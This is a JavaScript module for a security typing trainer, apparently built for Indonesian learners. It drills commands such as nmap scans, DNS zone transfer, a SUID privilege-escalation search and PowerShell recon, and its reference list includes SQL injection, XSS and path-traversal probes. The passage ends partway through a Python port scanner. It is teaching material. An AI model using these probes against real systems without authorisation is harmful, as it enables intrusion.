// ================================================================
// CYBER SECURITY TYPING TRAINER — cyber-trainer.js
// TypeCraft Add-on Module
//
// FEATURES:
//   • 17 Topik Lengkap: Networking → Profesional
//   • 4 Mode: Practice, Memory, Speed, Exam
//   • Konten: Commands, Concepts, Tools, Scripts
//   • Live terminal output simulation
//   • Mastery tracking per topik & per stage
//   • XP system terintegrasi dengan TypeCraft
//   • Syntax highlighting untuk bash/python/terminal
//   • Roadmap progress tracker visual
//
// HOW TO INTEGRATE:
//   Load AFTER main scripts di index.html:
//   <script src="cyber-trainer.js"></script>
// ================================================================
'use strict';

// ================================================================
// INJECT PAGE HTML
// ================================================================
function injectCyberPage() {
  let page = document.getElementById('page-cybertrainer');

  // Jika belum ada sama sekali (index.html original), buat dan append ke .main
  if (!page) {
    const main = document.querySelector('.main');
    if (!main) { console.error('CyberTrainer: .main not found'); return; }
    page = document.createElement('div');
    page.className = 'page';
    page.id = 'page-cybertrainer';
    main.appendChild(page);
    console.log('CyberTrainer: page div created ✓');
  }

  // Jika sudah berisi konten cyber (bukan placeholder), skip
  if (page.querySelector('.cy-header')) return;

  // Isi konten
  page.innerHTML = `
<!-- ═══ CYBER SECURITY TRAINER PAGE ═══ -->
<div class="cy-header">
  <div class="cy-title-row">
    <div>
      <h2 class="section-title" style="margin-bottom:4px">🔐 Cyber Security Trainer</h2>
      <div style="font-size:13px;color:var(--text3)">17 Topik · Pemula → Profesional · Commands · Tools · Concepts</div>
    </div>
    <div class="cy-header-stats">
      <div class="cy-stat-pill" id="cy-stage-pill">📡 Fondasi</div>
      <div class="cy-stat-pill"><span id="cy-xp-val">0</span> XP</div>
      <div class="cy-stat-pill">🔥 <span id="cy-streak-val">0</span></div>
      <div class="cy-stat-pill">Lv <span id="cy-level-val">1</span></div>
    </div>
  </div>
  <div class="cy-xp-bar-wrap"><div class="cy-xp-bar" id="cy-xp-bar" style="width:0%"></div></div>
  <div style="display:flex;justify-content:space-between;font-size:11px;color:var(--text3);margin-top:4px">
    <span id="cy-rank-label">Script Kiddie</span>
    <span><span id="cy-xp-cur">0</span> / <span id="cy-xp-nxt">300</span> XP to next level</span>
  </div>
</div>

<!-- Top Controls -->
<div class="cy-controls-row">
  <!-- Topic Selector -->
  <div class="cy-topic-scroll" id="cy-topic-tabs"></div>
  <!-- Mode Selector -->
  <div class="cy-seg-group" id="cy-mode-tabs">
    <button class="cy-seg active" data-mode="practice" onclick="cySetMode('practice',this)" title="Baca dan ketik">📖 Practice</button>
    <button class="cy-seg" data-mode="memory"   onclick="cySetMode('memory',this)"   title="Hafalkan lalu ketik">🧠 Memory</button>
    <button class="cy-seg" data-mode="speed"    onclick="cySetMode('speed',this)"    title="Ketik secepat mungkin">⚡ Speed</button>
    <button class="cy-seg" data-mode="exam"     onclick="cySetMode('exam',this)"     title="Tanpa hint">🏆 Exam</button>
  </div>
  <!-- Type Filter -->
  <div class="cy-seg-group" id="cy-type-tabs">
    <button class="cy-seg active" data-type="all"     onclick="cySetType('all',this)">All</button>
    <button class="cy-seg"        data-type="command" onclick="cySetType('command',this)">⌨️ Command</button>
    <button class="cy-seg"        data-type="concept" onclick="cySetType('concept',this)">📚 Concept</button>
    <button class="cy-seg"        data-type="script"  onclick="cySetType('script',this)">🐍 Script</button>
  </div>
  <button class="btn btn-primary btn-sm" onclick="cyNewChallenge()" style="flex-shrink:0">↺ New</button>
</div>

<!-- Mode Banner -->
<div class="cy-mode-banner" id="cy-mode-banner">
  <span style="font-size:20px" id="cy-mode-icon">📖</span>
  <div>
    <div style="font-weight:700;font-size:13px" id="cy-mode-title">Practice Mode</div>
    <div style="font-size:12px;color:var(--text2)" id="cy-mode-desc">Ketik command/script sambil melihat referensi. Pelajari syntax security tools.</div>
  </div>
  <div style="margin-left:auto;display:flex;gap:10px;align-items:center">
    <div class="cy-mini-stat"><span id="cy-stat-wpm">0</span><span class="cy-mini-label">WPM</span></div>
    <div class="cy-mini-stat"><span id="cy-stat-acc">100%</span><span class="cy-mini-label">Accuracy</span></div>
    <div class="cy-mini-stat"><span id="cy-stat-prog">0%</span><span class="cy-mini-label">Progress</span></div>
  </div>
</div>

<!-- Memory Phase -->
<div class="cy-memorize-phase" id="cy-memorize-phase" style="display:none">
  <div class="cy-memorize-card">
    <div class="cy-mem-header">
      <span style="font-size:20px">🧠</span>
      <div>
        <div style="font-weight:700;font-size:14px">PHASE 1 — Pelajari Command/Konsep Ini</div>
        <div style="font-size:12px;color:var(--text2)">Baca dan hafalkan. Akan disembunyikan dalam <span id="cy-mem-countdown">10</span>s</div>
      </div>
      <button class="btn btn-primary btn-sm" style="margin-left:auto" onclick="cyStartMemoryRecall()">Siap! →</button>
    </div>
    <div class="cy-mem-code-display" id="cy-mem-code-display"></div>
    <div class="cy-mem-progress-bar"><div class="cy-mem-progress-fill" id="cy-mem-progress-fill" style="width:100%"></div></div>
  </div>
</div>

<!-- MAIN SPLIT SCREEN -->
<div class="cy-split-screen" id="cy-split-screen">

  <!-- LEFT: Editor Panel -->
  <div class="cy-left-panel">

    <!-- Challenge Info -->
    <div class="cy-challenge-info" id="cy-challenge-info">
      <div style="display:flex;align-items:center;gap:8px;margin-bottom:8px;flex-wrap:wrap">
        <span class="cy-stage-badge" id="cy-stage-badge">Fondasi</span>
        <span class="cy-type-badge"  id="cy-type-badge">Command</span>
        <span class="cy-topic-tag"   id="cy-topic-tag">Networking</span>
        <span style="margin-left:auto;font-size:11px;color:var(--text3)" id="cy-challenge-num">#1</span>
      </div>
      <div style="font-size:13px;font-weight:600;color:var(--text);margin-bottom:4px" id="cy-challenge-title">Loading...</div>
      <div style="font-size:12px;color:var(--text2);line-height:1.6" id="cy-challenge-desc"></div>
    </div>

    <!-- Reference Code -->
    <div class="cy-reference-wrap" id="cy-reference-wrap">
      <div class="cy-ref-header">
        <span style="font-size:11px;font-weight:700;color:var(--text3);text-transform:uppercase;letter-spacing:.08em">Reference</span>
        <div style="margin-left:auto;display:flex;gap:6px">
          <button class="btn btn-ghost btn-sm" id="cy-hint-btn" onclick="cyToggleHint()">💡 Hint</button>
          <button class="btn btn-ghost btn-sm" onclick="cyCopyRef()">📋</button>
        </div>
      </div>
      <div class="cy-ref-code" id="cy-ref-code"></div>
      <div class="cy-syntax-panel" id="cy-syntax-panel" style="display:none">
        <div style="font-size:11px;font-weight:700;color:var(--accent);margin-bottom:6px">📖 Penjelasan</div>
        <div id="cy-syntax-explain-content" style="font-size:12px;color:var(--text2);line-height:1.7"></div>
      </div>
    </div>

    <!-- Typing Area -->
    <div class="cy-typing-area">
      <div class="cy-typing-header">
        <span style="font-size:11px;font-weight:700;color:var(--text3);text-transform:uppercase;letter-spacing:.08em" id="cy-typing-label">Ketik di sini</span>
        <div style="margin-left:auto;display:flex;gap:6px">
          <button class="btn btn-ghost btn-sm" onclick="cyClearInput()">✕ Clear</button>
          <button class="btn btn-ghost btn-sm" onclick="cyCheckAnswer()" id="cy-check-btn">✓ Check</button>
        </div>
      </div>
      <div class="cy-typing-display" id="cy-typing-display">
        <div style="color:var(--text3);font-size:13px;padding:12px">Mulai mengetik di bawah...</div>
      </div>
      <textarea
        id="cy-input"
        class="cy-input"
        placeholder="Ketik command/script di sini..."
        spellcheck="false"
        autocorrect="off"
        autocapitalize="off"
        autocomplete="off"
        oninput="cyHandleInput()"
        onkeydown="cyHandleKeydown(event)"
      ></textarea>
      <div class="cy-result-bar" id="cy-result-bar" style="display:none">
        <div class="cy-result-item good"><span id="cy-res-score">100%</span><span class="cy-res-label">Score</span></div>
        <div class="cy-result-item"><span id="cy-res-wpm">0</span><span class="cy-res-label">WPM</span></div>
        <div class="cy-result-item"><span id="cy-res-acc">100%</span><span class="cy-res-label">Accuracy</span></div>
        <div class="cy-result-item"><span id="cy-res-time">0s</span><span class="cy-res-label">Time</span></div>
        <button class="btn btn-primary btn-sm" onclick="cyNewChallenge()" style="margin-left:auto">Next →</button>
      </div>
    </div>

    <!-- Mastery Row -->
    <div class="cy-mastery-row" id="cy-mastery-row">
      <div class="cy-mastery-item" onclick="cyShowRoadmap()">
        <div style="font-size:11px;color:var(--text3);margin-bottom:4px">Roadmap Progress</div>
        <div class="cy-mastery-bar-wrap"><div class="cy-mastery-bar" id="cy-mastery-bar-fill" style="width:0%"></div></div>
        <div style="font-size:10px;color:var(--text3);margin-top:2px"><span id="cy-mastery-pct">0</span>% overall mastery · klik untuk roadmap</div>
      </div>
      <div style="font-size:12px;color:var(--text3)">
        Errors: <span id="cy-mistake-count" style="color:var(--red)">0</span> &nbsp;|&nbsp;
        Best WPM: <span id="cy-best-wpm" style="color:var(--accent2)">0</span> &nbsp;|&nbsp;
        Done: <span id="cy-challenges-done" style="color:var(--green)">0</span>
      </div>
    </div>

  </div><!-- /cy-left-panel -->

  <!-- DIVIDER -->
  <div class="cy-divider" id="cy-divider"></div>

  <!-- RIGHT: Terminal / Info Panel -->
  <div class="cy-right-panel" id="cy-right-panel">
    <div class="cy-preview-header">
      <span class="panel-dot red"></span>
      <span class="panel-dot yellow"></span>
      <span class="panel-dot green"></span>
      <span style="margin-left:8px;font-size:12px;color:var(--text3)" id="cy-preview-label">Terminal Output</span>
      <div style="margin-left:auto;display:flex;gap:6px">
        <button class="btn btn-ghost btn-sm" onclick="cyRunSimulation()">▶ Run</button>
        <button class="btn btn-ghost btn-sm" onclick="cyClearTerminal()">Clear</button>
      </div>
    </div>
    <!-- Terminal -->
    <div id="cy-terminal" class="cy-terminal">
      <div class="cy-term-line"><span class="cy-prompt">root@kali:~#</span> <span class="cy-term-text cy-dim">Pilih challenge dan klik Run untuk simulasi output...</span></div>
    </div>
    <!-- Syntax Helper -->
    <div class="cy-syntax-helper" id="cy-syntax-helper">
      <div style="font-size:11px;font-weight:700;color:var(--text3);padding:10px 14px 6px;text-transform:uppercase;letter-spacing:.08em">Cyber Reference</div>
      <div id="cy-syntax-helper-content" class="cy-syntax-helper-content"></div>
    </div>
  </div><!-- /cy-right-panel -->

</div><!-- /cy-split-screen -->

<!-- Roadmap Overlay -->
<div class="cy-roadmap-overlay" id="cy-roadmap-overlay" style="display:none" onclick="cyHideRoadmap()">
  <div class="cy-roadmap-panel" onclick="event.stopPropagation()">
    <div style="display:flex;justify-content:space-between;align-items:center;margin-bottom:16px">
      <h3 style="font-size:16px;font-weight:700">🗺️ Roadmap Progress</h3>
      <button class="btn btn-ghost btn-sm" onclick="cyHideRoadmap()">✕</button>
    </div>
    <div id="cy-roadmap-grid" class="cy-roadmap-grid"></div>
  </div>
</div>
`;
  console.log('CyberTrainer: Page content injected ✓');
}

// ================================================================
// INJECT CSS
// ================================================================
function injectCyberCSS() {
  if (document.getElementById('cy-styles')) return;
  const style = document.createElement('style');
  style.id = 'cy-styles';
  style.textContent = `
/* ── CYBER TRAINER STYLES ── */
#page-cybertrainer { display:none; flex-direction:column; gap:14px; }
#page-cybertrainer.active { display:flex; }

.cy-header{background:var(--bg2);border:1px solid var(--border);border-radius:var(--radius-lg);padding:18px 22px}
.cy-title-row{display:flex;align-items:flex-start;justify-content:space-between;gap:12px;margin-bottom:12px;flex-wrap:wrap}
.cy-header-stats{display:flex;gap:8px;flex-wrap:wrap}
.cy-stat-pill{background:var(--bg3);border:1px solid var(--border);padding:5px 12px;border-radius:20px;font-size:12px;font-weight:600;font-family:var(--font-data)}
.cy-xp-bar-wrap{background:var(--bg3);border-radius:4px;height:5px;overflow:hidden}
.cy-xp-bar{height:100%;background:linear-gradient(90deg,#5de0a0,#60a5fa);transition:width .5s}

.cy-controls-row{display:flex;flex-wrap:wrap;gap:10px;align-items:center;background:var(--bg2);border:1px solid var(--border);border-radius:var(--radius);padding:10px 14px}
.cy-topic-scroll{display:flex;gap:4px;overflow-x:auto;max-width:340px;padding-bottom:2px;scrollbar-width:thin}
.cy-topic-scroll::-webkit-scrollbar{height:3px}
.cy-topic-scroll::-webkit-scrollbar-thumb{background:var(--border);border-radius:3px}
.cy-seg-group{display:flex;gap:2px;background:var(--bg3);border-radius:8px;padding:3px;flex-shrink:0}
.cy-seg{padding:5px 11px;border-radius:6px;font-size:11px;font-weight:600;cursor:pointer;background:transparent;border:none;color:var(--text2);font-family:var(--font-ui);transition:all .15s;white-space:nowrap}
.cy-seg:hover{background:var(--bg2);color:var(--text)}
.cy-seg.active{background:var(--green);color:#0d1a14}
.cy-topic-btn{padding:5px 10px;border-radius:6px;font-size:11px;font-weight:600;cursor:pointer;background:var(--bg3);border:1px solid var(--border);color:var(--text2);transition:all .15s;white-space:nowrap;flex-shrink:0}
.cy-topic-btn:hover{background:var(--bg2);color:var(--text)}
.cy-topic-btn.active{background:rgba(93,224,160,0.15);color:var(--green);border-color:rgba(93,224,160,0.4)}

.cy-mode-banner{background:var(--bg2);border:1px solid var(--border);border-radius:var(--radius);padding:12px 16px;display:flex;align-items:center;gap:14px;flex-wrap:wrap}
.cy-mini-stat{display:flex;flex-direction:column;align-items:center;min-width:44px}
.cy-mini-stat span:first-child{font-size:18px;font-weight:700;font-family:var(--font-data);color:var(--green)}
.cy-mini-label{font-size:10px;color:var(--text3);margin-top:1px}

.cy-memorize-phase{background:linear-gradient(135deg,rgba(93,224,160,.08),rgba(96,165,250,.05));border:1px solid rgba(93,224,160,.25);border-radius:var(--radius-lg);padding:20px}
.cy-memorize-card{display:flex;flex-direction:column;gap:12px}
.cy-mem-header{display:flex;align-items:center;gap:12px}
.cy-mem-code-display{background:var(--bg3);border:1px solid var(--border);border-radius:10px;padding:16px 20px;font-family:var(--font-mono);font-size:13px;line-height:1.8;white-space:pre-wrap;word-break:break-all;color:var(--green)}
.cy-mem-progress-bar{background:var(--bg3);border-radius:4px;height:4px;overflow:hidden}
.cy-mem-progress-fill{height:100%;background:linear-gradient(90deg,var(--green),var(--blue));transition:width .1s linear}

.cy-split-screen{display:grid;grid-template-columns:1fr 6px 1fr;gap:0;min-height:560px}
@media(max-width:900px){.cy-split-screen{grid-template-columns:1fr;grid-template-rows:auto 6px auto}}
.cy-left-panel{display:flex;flex-direction:column;gap:12px;min-width:0}
.cy-divider{background:var(--border);cursor:col-resize;transition:background .2s;border-radius:3px}
.cy-divider:hover{background:var(--green)}
.cy-right-panel{display:flex;flex-direction:column;min-width:0;background:var(--bg2);border:1px solid var(--border);border-radius:var(--radius-lg);overflow:hidden}

.cy-challenge-info{background:var(--bg2);border:1px solid var(--border);border-radius:var(--radius);padding:14px 16px}
.cy-stage-badge{background:rgba(93,224,160,0.1);color:var(--green);border:1px solid rgba(93,224,160,0.3);font-size:10px;font-weight:700;padding:2px 8px;border-radius:20px}
.cy-type-badge{background:rgba(96,165,250,0.1);color:var(--blue);border:1px solid rgba(96,165,250,0.3);font-size:10px;font-weight:700;padding:2px 8px;border-radius:20px}
.cy-topic-tag{background:var(--bg3);color:var(--text3);font-size:10px;font-weight:600;padding:2px 8px;border-radius:20px;font-family:var(--font-mono)}

.cy-reference-wrap{background:var(--bg2);border:1px solid var(--border);border-radius:var(--radius);overflow:hidden}
.cy-ref-header{display:flex;align-items:center;padding:10px 14px;border-bottom:1px solid var(--border)}
.cy-ref-code{padding:16px 20px;font-family:var(--font-mono);font-size:13px;line-height:1.8;white-space:pre-wrap;word-break:break-all;color:var(--accent2);max-height:240px;overflow-y:auto}
.cy-syntax-panel{padding:12px 16px;border-top:1px solid var(--border);background:rgba(93,224,160,0.04)}

.cy-typing-area{background:var(--bg2);border:1px solid var(--border);border-radius:var(--radius);overflow:hidden}
.cy-typing-header{display:flex;align-items:center;padding:10px 14px;border-bottom:1px solid var(--border)}
.cy-typing-display{padding:12px 16px;font-family:var(--font-mono);font-size:14px;line-height:1.9;min-height:72px;word-break:break-all;border-bottom:1px solid var(--border)}
.cy-input{width:100%;background:var(--bg3);border:none;border-bottom:1px solid var(--border);padding:12px 16px;font-size:14px;font-family:var(--font-mono);color:var(--text);outline:none;resize:none;min-height:90px;caret-color:var(--green)}
.cy-input:focus{border-bottom-color:var(--green);box-shadow:inset 0 -2px 0 rgba(93,224,160,0.2)}
.cy-result-bar{display:flex;align-items:center;gap:14px;padding:12px 16px;background:rgba(93,224,160,0.04);flex-wrap:wrap}
.cy-result-item{display:flex;flex-direction:column;align-items:center;min-width:44px}
.cy-result-item span:first-child{font-size:18px;font-weight:700;font-family:var(--font-data);color:var(--text)}
.cy-result-item.good span:first-child{color:var(--green)}
.cy-res-label{font-size:10px;color:var(--text3);margin-top:1px}

.cy-mastery-row{background:var(--bg2);border:1px solid var(--border);border-radius:var(--radius);padding:12px 16px;display:flex;align-items:center;justify-content:space-between;gap:12px;flex-wrap:wrap}
.cy-mastery-item{flex:1;min-width:160px;cursor:pointer}
.cy-mastery-bar-wrap{background:var(--bg3);border-radius:4px;height:5px;overflow:hidden;margin:4px 0}
.cy-mastery-bar{height:100%;background:linear-gradient(90deg,var(--green),var(--blue));transition:width .4s}

/* Terminal */
.cy-preview-header{display:flex;align-items:center;padding:8px 12px;border-bottom:1px solid var(--border);background:var(--bg3);gap:6px;flex-shrink:0}
.cy-terminal{flex:1;background:#0a0e12;padding:14px 16px;font-family:var(--font-mono);font-size:12px;line-height:1.8;overflow-y:auto;min-height:300px;max-height:420px}
.cy-term-line{display:flex;flex-wrap:wrap;gap:6px;margin-bottom:2px}
.cy-prompt{color:#5de0a0;font-weight:700;flex-shrink:0}
.cy-term-text{color:#c8ffd4;word-break:break-all}
.cy-term-text.cy-dim{color:#4a5568}
.cy-term-text.cy-warn{color:#f7b96a}
.cy-term-text.cy-err{color:#f76a6a}
.cy-term-text.cy-info{color:#60a5fa}
.cy-term-text.cy-success{color:#5de0c5}
.cy-term-cursor{display:inline-block;width:8px;height:14px;background:var(--green);animation:blink 1s infinite;vertical-align:middle;margin-left:2px}

.cy-syntax-helper{border-top:1px solid var(--border);padding-bottom:8px;max-height:180px;overflow-y:auto}
.cy-syntax-helper-content{padding:0 14px}
.cy-helper-item{padding:6px 0;border-bottom:1px solid var(--border);font-size:11px}
.cy-helper-item:last-child{border:none}
.cy-helper-token{font-family:var(--font-mono);color:var(--accent2);font-weight:600;margin-bottom:2px}
.cy-helper-desc{color:var(--text2);line-height:1.5}

/* Roadmap Overlay */
.cy-roadmap-overlay{position:fixed;inset:0;background:rgba(0,0,0,0.7);z-index:200;display:flex;align-items:center;justify-content:center;padding:20px}
.cy-roadmap-panel{background:var(--bg2);border:1px solid var(--border);border-radius:var(--radius-lg);padding:24px;width:100%;max-width:720px;max-height:80vh;overflow-y:auto}
.cy-roadmap-grid{display:grid;grid-template-columns:repeat(auto-fill,minmax(200px,1fr));gap:10px}
.cy-roadmap-card{background:var(--bg3);border:1px solid var(--border);border-radius:var(--radius);padding:12px 14px;cursor:pointer;transition:all .2s;position:relative;overflow:hidden}
.cy-roadmap-card::before{content:'';position:absolute;top:0;left:0;right:0;height:2px;background:var(--green);transform:scaleX(0);transform-origin:left;transition:transform .3s}
.cy-roadmap-card.done::before{transform:scaleX(1)}
.cy-roadmap-card:hover{border-color:rgba(93,224,160,0.3)}
.cy-roadmap-card .rmc-num{font-size:10px;color:var(--text3);font-family:var(--font-mono);margin-bottom:4px}
.cy-roadmap-card .rmc-name{font-size:13px;font-weight:600;margin-bottom:6px}
.cy-roadmap-card .rmc-bar-wrap{background:var(--bg2);border-radius:3px;height:3px;overflow:hidden}
.cy-roadmap-card .rmc-bar{height:100%;background:var(--green);transition:width .3s}
.cy-roadmap-card .rmc-pct{font-size:10px;color:var(--text3);margin-top:4px}
.cy-stage-label{grid-column:1/-1;font-size:11px;font-weight:700;color:var(--text3);text-transform:uppercase;letter-spacing:.08em;padding:8px 0 2px;border-bottom:1px solid var(--border);margin-bottom:2px}
`;
  document.head.appendChild(style);
  console.log('CyberTrainer: CSS injected ✓');
}

// ================================================================
// RANDOM UTILITIES
// ================================================================
const CyRng = {
  pick: arr => arr[Math.floor(Math.random() * arr.length)],
  range: (min, max) => Math.floor(Math.random() * (max - min + 1)) + min,
  shuffle: arr => [...arr].sort(() => Math.random() - 0.5),
};

// ================================================================
// CYBER REFERENCE DATA
// ================================================================
const CY_HELPERS = {
  networking: [
    { token: 'nmap -sV -sC', desc: '-sV: deteksi versi service. -sC: jalankan script default NSE.' },
    { token: 'nmap -p-', desc: 'Scan semua 65535 port. Lebih lambat tapi komprehensif.' },
    { token: 'wireshark -i eth0', desc: 'Capture traffic di interface eth0 secara real-time.' },
    { token: 'tcpdump -n -i eth0', desc: '-n: tidak resolve hostname. Ringan dibanding Wireshark.' },
  ],
  security: [
    { token: 'hashcat -m 0 -a 0', desc: '-m 0: MD5 hash. -a 0: dictionary attack mode.' },
    { token: 'john --wordlist=', desc: 'Crack password menggunakan wordlist dictionary.' },
    { token: 'openssl s_client', desc: 'Test koneksi SSL/TLS dan lihat sertifikat.' },
    { token: 'ssh-keygen -t ed25519', desc: 'Generate keypair Ed25519 yang lebih aman dari RSA.' },
  ],
  webpentest: [
    { token: "' OR '1'='1", desc: 'SQL Injection klasik untuk bypass login tanpa password.' },
    { token: '<script>alert(1)</script>', desc: 'XSS probe dasar untuk test reflected/stored XSS.' },
    { token: '../../../etc/passwd', desc: 'Path traversal untuk akses file di luar web root.' },
    { token: 'curl -I -X OPTIONS', desc: 'Cek HTTP methods yang diizinkan server.' },
  ],
  scripting: [
    { token: 'import socket', desc: 'Python socket untuk membuat koneksi TCP/UDP low-level.' },
    { token: 'subprocess.run()', desc: 'Jalankan command OS dari Python secara aman.' },
    { token: 'requests.get(url)', desc: 'HTTP GET request. Dasar web scraping dan API testing.' },
    { token: "re.findall(r'\\d+', s)", desc: 'Regex: cari semua angka dalam string.' },
  ],
};

// ================================================================
// TOPIC DEFINITIONS (17 topik sesuai roadmap)
// ================================================================
const CY_TOPICS = [
  { id:'networking',   label:'📡 Networking',       stage:'Fondasi',      num:1  },
  { id:'os',           label:'🖥️ Sistem OS',         stage:'Fondasi',      num:2  },
  { id:'scripting',    label:'🐍 Scripting',         stage:'Fondasi',      num:3  },
  { id:'concepts',     label:'🔒 Konsep Security',   stage:'Core Security',num:4  },
  { id:'tools',        label:'🛠️ Hands-on Tools',    stage:'Core Security',num:5  },
  { id:'platforms',    label:'🎯 Platform Latihan',  stage:'Core Security',num:6  },
  { id:'offensive',    label:'⚔️ Offensive/RedTeam', stage:'Spesialisasi', num:7  },
  { id:'defensive',    label:'🛡️ Defensive/BlueTeam',stage:'Spesialisasi', num:8  },
  { id:'cloud',        label:'☁️ Cloud Security',    stage:'Spesialisasi', num:9  },
  { id:'appsec',       label:'📱 AppSec/DevSecOps',  stage:'Spesialisasi', num:10 },
  { id:'malware',      label:'🦠 Malware Analysis',  stage:'Profesional',  num:11 },
  { id:'exploit',      label:'💣 Exploit Dev',       stage:'Profesional',  num:12 },
  { id:'bugbounty',    label:'💰 Bug Bounty',        stage:'Profesional',  num:13 },
  { id:'threatmodel',  label:'🗺️ Threat Modeling',   stage:'Profesional',  num:14 },
  { id:'reputation',   label:'🏆 Reputasi',          stage:'Profesional',  num:15 },
  { id:'homelab',      label:'🏠 Home Lab',          stage:'Bonus',        num:16 },
  { id:'english',      label:'🇬🇧 English IT',       stage:'Bonus',        num:17 },
];

// ================================================================
// CHALLENGE GENERATORS — per topik
// ================================================================
const CY_GENERATORS = {

  // ─── 1. NETWORKING ───────────────────────────────────────────
  networking: [
    () => ({
      type:'command', title:'Nmap Full Port Scan',
      desc:'Lakukan full port scan + deteksi versi service + default scripts pada target IP.',
      code:`nmap -sV -sC -p- -T4 --open 192.168.1.100 -oN scan_result.txt`,
      explanation:'• -sV: deteksi versi\n• -sC: NSE scripts default\n• -p-: semua port\n• -T4: timing agresif\n• --open: tampilkan port terbuka saja\n• -oN: simpan output ke file',
      simulation:['Starting Nmap scan...','Discovered open port 22/tcp (OpenSSH 8.2)','Discovered open port 80/tcp (Apache httpd 2.4.41)','Discovered open port 443/tcp (nginx 1.18)','Nmap done: 1 IP address scanned in 42.3s'],
      xp:40, helper:'networking'
    }),
    () => ({
      type:'command', title:'Wireshark + tcpdump Capture',
      desc:'Capture traffic HTTP di interface eth0 dan simpan ke file PCAP untuk analisis.',
      code:`tcpdump -i eth0 -w capture.pcap port 80 or port 443\n# Atau dengan filter host:\ntcpdump -i eth0 -n -w capture.pcap host 192.168.1.1 and port 80`,
      explanation:'• -i eth0: interface yang dipantau\n• -w: simpan ke file .pcap\n• port 80: filter hanya HTTP\n• -n: jangan resolve nama host\n• Ctrl+C untuk stop capture',
      simulation:['tcpdump: listening on eth0, link-type EN10MB','14:22:01 IP 192.168.1.5.54321 > 192.168.1.1.80: GET / HTTP/1.1','14:22:01 IP 192.168.1.1.80 > 192.168.1.5.54321: HTTP/1.1 200 OK','Captured 127 packets, 18924 bytes'],
      xp:45, helper:'networking'
    }),
    () => ({
      type:'command', title:'DNS Enumeration',
      desc:'Lakukan DNS enumeration untuk menemukan subdomain dan informasi DNS target.',
      code:`# DNS lookup dasar\nnslookup target.com\ndig target.com ANY\n\n# Zone transfer attempt\ndig axfr @ns1.target.com target.com\n\n# Subdomain brute force\nsubfinder -d target.com -o subdomains.txt`,
      explanation:'• nslookup: query DNS dasar\n• dig ANY: ambil semua record DNS\n• axfr: zone transfer (sering salah konfigurasi)\n• subfinder: tool subdomain enumeration modern',
      simulation:['Running DNS enumeration on target.com...','[+] mail.target.com -> 192.168.1.10','[+] admin.target.com -> 192.168.1.20','[+] dev.target.com -> 192.168.1.30','[*] Found 3 subdomains'],
      xp:50, helper:'networking'
    }),
    () => ({
      type:'concept', title:'OSI Model & Serangan per Layer',
      desc:'Pahami di layer mana serangan cyber terjadi berdasarkan model OSI 7 layer.',
      code:`# OSI Layer & Attack Mapping
Layer 7 - Application  : XSS, SQLi, CSRF, Phishing
Layer 6 - Presentation : SSL Stripping, Cert Spoofing
Layer 5 - Session      : Session Hijacking, Cookie Theft
Layer 4 - Transport    : TCP SYN Flood, Port Scanning
Layer 3 - Network      : IP Spoofing, ICMP Flood, Routing Attacks
Layer 2 - Data Link    : ARP Spoofing, MAC Flooding, VLAN Hopping
Layer 1 - Physical     : Cable Tapping, Hardware Keylogger`,
      explanation:'Setiap layer memiliki jenis serangan khas. Red Team perlu paham semua layer untuk serangan komprehensif, Blue Team perlu paham untuk deteksi yang tepat.',
      simulation:['[Layer 2] ARP Spoofing detected: MAC conflict on 192.168.1.1','[Layer 3] Port scan from 10.0.0.5: 1000 ports in 2s','[Layer 7] SQL Injection attempt blocked on /login'],
      xp:35, helper:'networking'
    }),
  ],

  // ─── 2. SISTEM OS ────────────────────────────────────────────
  os: [
    () => ({
      type:'command', title:'Linux File Permission & SUID',
      desc:'Kelola permission file Linux dan cari SUID binaries untuk privilege escalation.',
      code:`# Cek permission file
ls -la /etc/passwd
stat /bin/bash

# Cari file SUID (privilege escalation vector)
find / -perm -4000 -type f 2>/dev/null

# Ubah permission
chmod 755 script.sh   # rwxr-xr-x
chmod 600 private.key # rw-------
chown root:root file`,
      explanation:'• -perm -4000: cari SUID bit\n• 2>/dev/null: buang error output\n• SUID berarti file berjalan sebagai owner-nya\n• Ini vektor umum untuk local privilege escalation',
      simulation:['Searching for SUID binaries...','[SUID] /usr/bin/passwd (root)','[SUID] /usr/bin/sudo (root)','[!] /usr/local/bin/custom_app (root) <- SUSPICIOUS','Found 12 SUID binaries'],
      xp:55, helper:'networking'
    }),
    () => ({
      type:'command', title:'Windows PowerShell Recon',
      desc:'Gunakan PowerShell untuk reconnaissance di Windows — user, proses, jaringan.',
      code:`# Enumerasi user dan group
Get-LocalUser
Get-LocalGroupMember -Group "Administrators"

# Cek proses berjalan
Get-Process | Sort-Object CPU -Descending | Select -First 10

# Koneksi jaringan aktif
netstat -ano | findstr ESTABLISHED

# Cek service yang berjalan
Get-Service | Where-Object {$_.Status -eq "Running"}`,
      explanation:'• Get-LocalUser: list semua user lokal\n• Get-LocalGroupMember: cek member admin group\n• netstat -ano: lihat koneksi + PID\n• Berguna untuk post-exploitation recon',
      simulation:['PS C:\\> Get-LocalUser','Name           Enabled','----           -------','Administrator  True','Guest          False','hacker_user    True  <- SUSPICIOUS'],
      xp:60, helper:'networking'
    }),
    () => ({
      type:'command', title:'Linux Log Analysis',
      desc:'Analisis log Linux untuk mendeteksi intrusi dan aktivitas mencurigakan.',
      code:`# Auth log - login attempts
cat /var/log/auth.log | grep "Failed password"
grep "Accepted password" /var/log/auth.log

# Count failed login per IP
grep "Failed password" /var/log/auth.log | \
  awk '{print $11}' | sort | uniq -c | sort -rn | head -10

# Cek last login
last -n 20
lastb | head -20   # failed logins

# Real-time monitoring
tail -f /var/log/auth.log`,
      explanation:'• auth.log: semua aktivitas autentikasi\n• uniq -c: hitung duplikat\n• sort -rn: sort descending numerik\n• lastb: log login yang gagal',
      simulation:['Analyzing auth.log...','  127 Failed: 185.220.101.12 <- Brute force!','   45 Failed: 103.99.0.122','   12 Failed: 192.168.1.50','[ALERT] Brute force attack detected from 185.220.101.12'],
      xp:65, helper:'networking'
    }),
  ],

  // ─── 3. SCRIPTING ────────────────────────────────────────────
  scripting: [
    () => ({
      type:'script', title:'Python Port Scanner',
      desc:'Buat port scanner sederhana dengan Python menggunakan modul socket.',
      code:`import socket
import concurrent.futures
from datetime import datetime

def scan_port(host, port, timeout=1):
    try:
        with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
            s.settimeout(timeout)
            result = s.connect_ex((host, port))
            if result == 0:
                try:
                    service = socket.getservbyport(port)
                except:
                    service = "unknown"
                return port, service
    except:
        pass
    return None

def scan_host(host, start_port=1, end_port=1024):
    print(f"[*] Scanning {host} ({start_port}-{end_port})")
    print(f"[*] Started: {datetime.now().strftime('%H:%M:%S')}")
    open_ports = []
    with concurrent.futures.ThreadPoolExecutor(max_workers=100) as ex:
